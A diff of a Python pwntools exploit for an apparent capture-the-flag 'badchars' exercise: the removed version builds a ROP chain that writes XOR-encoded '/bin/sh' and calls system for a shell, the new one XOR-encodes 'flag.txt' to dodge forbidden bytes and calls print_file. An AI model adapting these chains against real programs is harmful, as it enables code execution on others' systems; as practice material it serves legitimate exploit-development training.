@@ -1,46 +1,63 @@
 #!/usr/bin/env python3
 from pwn import *
 
-# DO NOT write at start of data segment, it gets used by libc and fucks things up.
-system_plt = 0x00007ffff7a6bc30
-pop_rdi =  0x00000000004006a3
-pop_r14_r15 = 0x00000000004006a0
-xor_r15_r14 = 0x0000000000400628
-mov_r13_r12 = 0x0000000000400634
-pop_r12_r13 = 0x000000000040069c
-data_seg = 0x0000000000601028 + 8
+elf = ELF('badchars')                 #context.binary
 
-bin_sh = b'/bin/sh\x00'
-encoded_bin_sh = b''
-xor_byte = 0x23
+def convertASCII_to_Hex(value):
+      res = ""
+      for i in value:
+            res += hex(ord(i))[2:]
+      return res
 
-for i in bin_sh:
-    encoded_bin_sh = encoded_bin_sh + bytes(i ^ xor_byte)
+def changeEndian(value):
+      length = len(value)
+      res = "0x"
+      for i in range(length-1, 0, -2):
+            res += value[i-1]+ value[i]
+      return res      
 
-# RIP offset is at 40
-rop = b"A" * 40
+def generateString(value):
+      return int(changeEndian(convertASCII_to_Hex(value)), 16)
+     
+#badchars are: 'x', 'g', 'a', '.'
+# in hex: 78, 67, 61, 2e
+def xorByTwo(value):
+    res = ""
+    for i in value:
+        res += chr(int(convertASCII_to_Hex(i), 16) ^ 2)
+    print(res)
+    return res
 
-# Write encoded /bin/sh to data_seg
-rop += p64(pop_r12_r13)
-rop += encoded_bin_sh
-rop += p64(data_seg)
-rop += p64(mov_r13_r12)
+p = process(elf.path)
 
-# Decode data
-for i in range(len(encoded_bin_sh)):
-    rop += p64(pop_r14_r15)
-    rop += p64(xor_byte)
-    rop += p64(data_seg + i)
-    rop += p64(xor_r15_r14)
+#Prepare the payload
+junk = b"A"*40                                              
+pop_r12_r13_r14_r15 = p64(0x000000000040069c)
+pop_r14_r15 = p64(0x00000000004006a0)                               
+data_address = 0x00601038                                   
+flag = p64(generateString(xorByTwo("flag.txt")))            
+xor_r14_r15 = p64(0x0000000000400628)
+pop_rdi = p64(0x00000000004006a3)                           
+print_file = p64(0x00400510)                                
+mov_r13_r12 = p64(0x0000000000400634)
 
-# Pop address to '/bin/sh'
-rop += p64(pop_rdi)
-rop += p64(data_seg)
+#payload
+payload = junk
+payload += pop_r12_r13_r14_r15
+payload += flag + p64(data_address) + p64(1) + p64(1)       #For the last 2 registers you can write any 64bit integer 
+payload += mov_r13_r12
 
-# call system@plt
-rop += p64(system_plt)
+for i in range(8):
+    payload += pop_r14_r15
+    payload += p64(2) + p64(data_address + i)
+    payload += xor_r14_r15
 
-# Start process and send rop chain
-e = process('badchars')
-e.send(rop)
-print(e.recvall())
+payload += pop_rdi
+payload += p64(data_address)
+payload += print_file
+
+# Send the payload
+
+p.sendline(payload)                 #send the payload to the process
+
+p.interactive()	
